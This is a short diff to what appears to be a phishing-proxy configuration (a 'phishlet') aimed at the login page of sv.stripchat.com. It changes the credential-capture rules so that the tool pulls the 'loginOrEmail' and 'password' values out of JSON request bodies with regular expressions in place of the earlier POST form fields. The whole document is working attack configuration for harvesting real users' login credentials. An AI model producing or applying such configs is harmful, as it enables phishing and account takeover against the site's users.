@@ -21,13 +21,13 @@ auth_urls:
   - '/auth/login'
 credentials:
   username:
-    key: 'loginOrEmail'
-    search: '(.*)'
-    type: 'post'
+    key: ''
+    search: '"loginOrEmail":"([^"]*)"'
+    type: 'json'
   password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
+    key: ''
+    search: '"password":"([^"]*)"'
+    type: 'json'
 login:
   domain: 'sv.stripchat.com'
   path: '/login'
